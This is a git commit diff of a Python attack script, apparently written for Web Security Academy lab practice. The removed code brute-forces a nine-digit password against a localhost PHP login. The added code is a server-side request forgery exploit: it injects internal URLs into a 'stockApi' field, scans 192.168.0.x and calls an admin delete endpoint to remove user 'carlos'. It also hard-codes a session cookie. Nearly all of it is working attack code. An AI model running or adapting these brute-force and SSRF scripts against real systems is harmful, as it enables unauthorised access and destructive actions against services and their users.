b4aae89774924cf9845fea73cdf3d2337557ee2e
Abdallah Eldesouky <52884095+abdallah0x01@users.noreply.github.com>
2022-10-13 01:43:29 +0200

    Update script.py

--- script.py
+++ script.py
@@ -6,52 +6,53 @@ start = time.perf_counter()
 found = False
 
 
-def check_response(response):
-    if 'sara' in response:
-        return True
+def run_request(num):
 
-
-def run_request(password):
+    cookies = {
+        'session': '2JhC6YF1ryS7jOjAkK9n9N2DCdCqsLvO',
+        'SL_G_WPT_TO': 'en',
+        'SL_GWPT_Show_Hide_tmp': '1',
+        'SL_wptGlobTipTmp': '1',
+    }
 
     headers = {
-        'Host': 'localhost',
-        'sec-ch-ua': '"Not;A=Brand";v="99", "Chromium";v="106"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Host': '0a8600320460cf62c0292098003a003a.web-security-academy.net',
+        # 'Content-Length': '96',
+        'Dnt': '1',
+        'Sec-Ch-Ua-Mobile': '?0',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
+        'Sec-Ch-Ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+        'Sec-Ch-Ua-Platform': '"Windows"',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': '*/*',
+        'Origin': 'https://0a8600320460cf62c0292098003a003a.web-security-academy.net',
         'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-User': '?1',
-        'Sec-Fetch-Dest': 'document',
-        'Referer': 'http://localhost/php/',
-        # 'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'https://0a8600320460cf62c0292098003a003a.web-security-academy.net/product?productId=1',
+        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
         'Connection': 'close',
+
     }
 
-    params = {
-        'username': 'sara',
-        'password': f'{password}',
-        'login': 'login',
-    }
+    data = f'stockApi=http://192.168.0.{num}:8080/admin/delete?username=carlos'
 
-    response = requests.get(
-        'http://localhost/php/login.php', params=params, headers=headers)
+    response = requests.post('https://0a8600320460cf62c0292098003a003a.web-security-academy.net/product/stock',
+                             cookies=cookies, headers=headers, data=data)
+    print(num, response.status_code)
 
-    if check_response(response.text) == True:
+    if response.status_code == 200:
+
         global found
         found = True
-        print(f'\n######## passsword: {password} ########')
 
 
-# 333666555
-for i in range(1000000000):
-    print('tring {0:09}'.format(i))
-    run_request('{0:09}'.format(i))
+for i in range(256):
+    run_request(i)
 
     if found == True:
+        print(f'ip: 192.168.0.{i}')
+        print('carlos deleted')
         break
 
 end = time.perf_counter()
